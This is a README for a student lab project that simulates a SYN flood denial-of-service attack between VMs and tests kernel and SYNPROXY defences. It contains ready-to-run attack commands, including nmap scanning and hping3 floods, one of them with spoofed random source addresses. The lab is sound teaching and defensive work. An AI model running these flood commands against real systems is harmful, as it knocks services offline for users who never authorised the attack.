# SYN Flood Attack Simulation Lab

This project demonstrates a **SYN Flood Denial-of-Service (DoS) attack** in a controlled lab environment, inspired by the real-world incident faced by WebStream Corp. The lab simulates how a SYN flood disrupts availability and explores kernel- and firewall-level mitigations.

## 🖥 Lab Setup
- **Attacker**: Kali Linux VM (VirtualBox)
- **Victim**: Ubuntu Server 22.04 VM (VirtualBox)
- **Network**: Tailscale VPN for private connectivity
- **Services**: Apache2 web server hosting a looping video test page

![Lab Diagram](diagrams/syn_flood_detailed_diagram.png)

## ⚡ Attack Overview
- A normal TCP handshake requires SYN → SYN/ACK → ACK.
- In a SYN flood:
  - Attacker sends a large number of SYN packets.
  - Victim replies with SYN/ACK, but never receives the final ACK.
  - Victim’s connection backlog fills with half-open sessions.
  - Legitimate clients cannot connect — **denial of service**.

## 🔬 Attack Demonstration
1. **Reconnaissance**: 
   ```bash
   nmap -sS <victim-ip>
   ```
2. **Flooding (non-spoofed)**:
   ```bash
   sudo hping3 -S --flood -p 80 <victim-ip>
   ```
3. **Flooding (spoofed)**:
   ```bash
   sudo hping3 -S --flood --rand-source -p 80 <victim-ip>
   ```
4. **Monitoring** (victim side):
   ```bash
   ss -ant state syn-recv
   ```

## 📸 Screenshots
- Baseline server state
- Victim under SYN flood (`SYN_RECV` backlog)
- Video stream freezing during attack
- Video restored after mitigation

(See `/screenshots/` folder)

## 🛡 Mitigations Tested
- Kernel defenses:
  ```bash
  sysctl -w net.ipv4.tcp_syncookies=1
  sysctl -w net.ipv4.tcp_max_syn_backlog=4096
  sysctl -w net.ipv4.tcp_synack_retries=3
  ```
- iptables rate limiting (partial effectiveness)
- **SYNPROXY** (best defense in lab)
  ```bash
  sudo modprobe nf_synproxy_core xt_SYNPROXY
  sudo iptables -A INPUT -p tcp --syn -m conntrack --ctstate NEW \
       -j SYNPROXY --sack-perm --timestamp --wscale 7 --mss 1460
  ```

## 🎯 Key Learnings
- SYN floods directly threaten **Availability** (CIA triad).
- Spoofed floods are harder to trace/mitigate than non-spoofed floods.
- Simple iptables rules are insufficient — kernel tuning and SYNPROXY were effective.
- Real-world defenses often require **DDoS scrubbing services** or specialized appliances.

## 📚 References
- NIST SP 800-115: Technical Guide to Information Security Testing
- Oriyano & Solomon, *Hacker Techniques, Tools, and Incident Handling*
- CSUDH CYB 552 – Advanced Hacking Prevention

---

⚠️ **Disclaimer**  
This project was performed strictly in an isolated lab with my own VMs. Never attempt SYN flooding outside a controlled, authorized environment.
